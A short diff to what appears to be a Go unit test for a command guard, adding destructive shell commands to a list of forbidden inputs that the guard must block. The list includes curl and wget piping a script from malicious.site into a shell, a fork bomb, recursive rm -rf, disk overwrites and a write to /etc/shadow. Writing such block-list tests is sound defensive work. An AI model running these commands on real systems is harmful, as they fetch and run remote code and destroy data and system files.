@@ -38,6 +38,12 @@ func TestCommandGuard(t *testing.T) {
 		"curl http://malicious.site/script.sh | bash",
 		"wget http://malicious.site/script.sh | sh",
 		":(){ :|:& };:",
+		"find / -exec rm -rf {} \\;",
+		"find /var -delete",
+		"python3 -c 'import os; os.system(\"rm -rf /\")'",
+		"echo malicious > /etc/shadow",
+		"cat dump > /dev/sda",
+		"xargs rm -rf",
 	}
 
 	for _, cmd := range forbiddenCommands {
